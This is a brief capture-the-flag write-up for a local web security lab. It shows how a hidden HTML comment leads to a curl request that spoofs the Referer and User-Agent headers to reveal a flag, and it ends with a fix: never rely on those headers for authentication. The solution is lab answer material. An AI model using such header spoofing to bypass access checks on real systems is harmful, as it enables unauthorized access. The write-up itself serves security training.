# 10 - Born To Sec

## Reproduce

In the copyright page: `http://192.168.1.19/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c`

We inspected the page while listning to the music, then we found a huge comment, so we search in it and we found some clues

`
<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->
`

`
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
`

So we sent a request with this specific user agent and referer:

`curl 'http://{IP}/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -e 'https://www.nsa.gov/' -A 'ft_bornToSec' | grep 'flag'`




## Fix 

- Never use `User Agent` and `Referer` as an authentication
